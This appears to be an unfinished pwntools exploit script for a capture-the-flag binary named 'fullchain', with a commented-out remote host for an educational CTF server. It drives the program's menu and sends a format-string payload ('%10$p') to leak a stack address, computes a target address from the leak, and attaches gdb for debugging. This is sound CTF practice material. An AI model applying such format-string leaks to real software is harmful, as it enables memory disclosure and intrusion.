from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = process('./fullchain')
# r = remote('edu-ctf.zoolab.org', 30209)

def myset(buf, data, length):
    r.sendlineafter("global or local > ", buf)
    r.sendlineafter("set, read or write > ", "set")
    r.sendlineafter("data > ", str(data))
    r.sendlineafter("length > ", str(length))

def read(buf, data):
    r.sendlineafter("global or local > ", buf)
    r.sendlineafter("set, read or write > ", "read")
    r.sendline(data)

def write(buf):
    r.sendlineafter("global or local > ", buf)
    r.sendlineafter("set, read or write > ", "write")

read('global', '%10$p')
write('global')
r.recvuntil('0x')
cnt_addr = int(r.recv(12), 16) - 0x2c
print(hex(cnt_addr))

myset('local', 12, 0x10)
gdb.attach(r)
write('global')

